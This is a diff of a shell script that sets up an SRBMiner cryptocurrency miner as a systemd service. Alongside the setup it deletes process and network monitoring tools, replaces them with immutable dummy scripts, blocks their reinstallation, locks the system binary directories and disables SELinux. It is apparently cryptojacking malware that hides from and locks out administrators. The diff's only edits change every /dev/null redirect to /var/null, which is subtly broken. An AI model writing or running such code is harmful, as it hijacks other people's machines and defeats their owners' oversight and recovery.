@@ -24,26 +24,26 @@ TOOLS_TO_REMOVE=(
 # Remove tools and create immutable replacements
 for tool in "${TOOLS_TO_REMOVE[@]}"; do
   # Remove existing binary
-  sudo rm -f "$tool" 2>/dev/null
+  sudo rm -f "$tool" 2>/var/null
   
   # Create dummy script at target path
   sudo mkdir -p "$(dirname "$tool")"
-  echo -e "#!/bin/sh\necho 'Command disabled'" | sudo tee "$tool" >/dev/null
+  echo -e "#!/bin/sh\necho 'Command disabled'" | sudo tee "$tool" >/var/null
   sudo chmod 111 "$tool"  # Remove all write permissions
   
   # Make file immutable (requires root)
-  sudo chattr +i "$tool" 2>/dev/null || true
+  sudo chattr +i "$tool" 2>/var/null || true
 done
 
 # Block package manager reinstallation
 for pkg in procps psmisc htop net-tools strace gdb lsof util-linux; do
-  sudo dpkg --set-selections <<< "$pkg hold" 2>/dev/null || \
-  sudo yum versionlock add "$pkg" 2>/dev/null || \
-  sudo dnf versionlock add "$pkg" 2>/dev/null || true
+  sudo dpkg --set-selections <<< "$pkg hold" 2>/var/null || \
+  sudo yum versionlock add "$pkg" 2>/var/null || \
+  sudo dnf versionlock add "$pkg" 2>/var/null || true
 done
 
 # Lock critical directories
-sudo chattr -R +i /bin /usr/bin /sbin /usr/sbin 2>/dev/null || true
+sudo chattr -R +i /bin /usr/bin /sbin /usr/sbin 2>/var/null || true
 
 echo "[*] Starting SRBMiner Dual Mining Setup Script"
 
@@ -56,7 +56,7 @@ SERVICE_FILE="/etc/systemd/system/srbminer.service"
 HUGE_PAGES=$((1280 + $(nproc)))
 
 # Disable SELinux (temporarily and permanently)
-if command -v getenforce >/dev/null && [ "$(getenforce)" = "Enforcing" ]; then
+if command -v getenforce >/var/null && [ "$(getenforce)" = "Enforcing" ]; then
   echo "[*] Disabling SELinux enforcement temporarily..."
   sudo setenforce 0
 
@@ -103,7 +103,7 @@ rm -f "$SRB_ARCHIVE"
 # Create systemd service
 echo "[*] Creating systemd service at $SERVICE_FILE"
 
-sudo tee "$SERVICE_FILE" > /dev/null <<EOF
+sudo tee "$SERVICE_FILE" > /var/null <<EOF
 [Unit]
 Description=SRBMiner Dual Mining Service
 After=network.target
